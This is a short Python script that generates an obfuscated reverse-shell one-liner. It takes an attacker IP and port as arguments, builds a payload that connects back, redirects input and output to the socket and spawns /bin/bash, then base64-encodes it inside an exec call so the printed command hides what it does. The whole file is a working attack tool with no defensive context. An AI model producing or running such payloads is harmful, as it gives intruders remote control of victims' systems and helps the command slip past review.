from sys import argv
import base64

rev_string='import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'.format(argv[1], argv[2])
#print(rev_string)

rev_string_bytes=rev_string.encode()
#print(rev_string_bytes)

rev_b64=base64.b64encode(rev_string_bytes)

rev="exec(__import__( 'base64' ).b64decode({}))".format(rev_b64)

print("python3 -c \"{}\"".format(rev))